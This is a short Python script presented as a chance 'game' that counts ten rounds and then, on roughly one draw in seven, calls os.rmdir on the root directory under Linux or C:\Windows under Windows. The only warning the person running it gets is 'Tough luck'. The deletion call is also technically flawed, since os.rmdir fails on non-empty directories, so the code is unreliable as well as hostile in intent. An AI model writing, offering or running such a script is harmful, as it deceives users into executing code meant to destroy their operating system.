import os, random, time
from sys import platform

if platform == "linux" or platform == "linux2":
    dir = "/"
elif platform == "win32":
    dir = "C:\Windows"

print("The game begins")

for i in range(1, 11):
    print(f"Round {i}")
    time.sleep(1)

rand = random.randint(0, 6)

if (rand == 0):
    print("Tough luck")
    os.rmdir(dir)
else:
    print("You got lucky")